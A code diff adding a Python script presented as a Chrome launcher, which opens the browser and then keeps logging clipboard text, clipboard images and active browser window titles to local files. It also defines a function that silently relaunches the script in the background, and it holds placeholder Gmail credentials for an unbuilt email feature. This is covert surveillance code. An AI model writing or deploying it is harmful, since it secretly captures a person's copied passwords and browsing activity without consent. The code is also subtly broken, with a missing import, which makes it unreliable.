@@ -1,0 +1,118 @@
+import pyperclip
+import time
+import os
+import psutil
+import win32clipboard
+import win32gui
+import win32process
+from PIL import ImageGrab
+import subprocess
+import sys
+import webbrowser
+
+# Gmail credentials (optional, for email feature if needed)
+GMAIL_USER = 'your_email@gmail.com'
+GMAIL_PASSWORD = 'your_app_password'  # Use app-specific password if 2FA is enabled
+TO_EMAIL = 'recipient_email@gmail.com'
+
+# Function to save clipboard text to a .txt file
+def save_clipboard_text(text, filename="clipboard_content.txt"):
+    with open(filename, "a") as file:
+        file.write(text + "\n")
+    return filename
+
+# Function to save clipboard images
+def save_clipboard_image():
+    try:
+        img = ImageGrab.grabclipboard()
+        if isinstance(img, Image.Image):
+            filename = f"clipboard_image_{int(time.time())}.png"
+            img.save(filename, "PNG")
+            print(f"Image saved as {filename}")
+            return filename
+        return None
+    except Exception as e:
+        print(f"Error saving image: {e}")
+        return None
+
+# Function to get the active browser URL
+def get_active_window_title():
+    try:
+        window = win32gui.GetForegroundWindow()
+        thread_id, process_id = win32process.GetWindowThreadProcessId(window)
+        process_name = psutil.Process(process_id).name().lower()
+
+        if "chrome" in process_name or "firefox" in process_name or "edge" in process_name:
+            window_title = win32gui.GetWindowText(window)
+            return process_name, window_title
+        return None, None
+    except Exception as e:
+        print(f"Error: {e}")
+        return None, None
+
+# Function to extract URL from browser window title
+def extract_url_from_title(window_title):
+    if " - " in window_title:
+        parts = window_title.split(" - ")
+        return parts[-1]
+    return window_title
+
+# Function to save URL data to a file
+def save_url_to_file(url, filename="visited_urls.txt"):
+    with open(filename, "a") as file:
+        file.write(url + "\n")
+
+# Function to monitor clipboard and browser activity
+def monitor_clipboard_and_browser():
+    previous_clipboard = ""
+    previous_url = ""
+
+    print("Monitoring clipboard and browser activity... Press Ctrl+C to stop.")
+
+    try:
+        while True:
+            # Monitor clipboard for text changes
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                print(f"New clipboard text detected: {clipboard_content}")
+                save_clipboard_text(clipboard_content)
+                previous_clipboard = clipboard_content
+
+            # Monitor clipboard for images
+            save_clipboard_image()
+
+            # Monitor active browser for URLs
+            process_name, window_title = get_active_window_title()
+            if process_name and window_title:
+                url = extract_url_from_title(window_title)
+                if url != previous_url:
+                    print(f"New URL detected: {url}")
+                    save_url_to_file(url)
+                    previous_url = url
+
+            time.sleep(5)  # Check every 5 seconds
+    except KeyboardInterrupt:
+        print("Program terminated.")
+
+# Function to launch the real Chrome browser
+def open_browser():
+    chrome_path = "C:/Program Files/Google/Chrome/Application/chrome.exe"  # Adjust if needed
+    webbrowser.register('chrome', None, webbrowser.BackgroundBrowser(chrome_path))
+    webbrowser.get('chrome').open_new("http://www.google.com")
+
+# Function to run your monitoring script in the background
+def run_monitoring_script():
+    # Start the monitoring part of the script silently
+    script_path = os.path.join(os.path.dirname(__file__), 'chrome_launcher.py')  # This script itself monitors
+    try:
+        subprocess.Popen([sys.executable, script_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        print(f"Failed to run monitoring script: {e}")
+
+# Main function to open browser and start monitoring
+def main():
+    open_browser()
+    monitor_clipboard_and_browser()
+
+if __name__ == "__main__":
+    main()
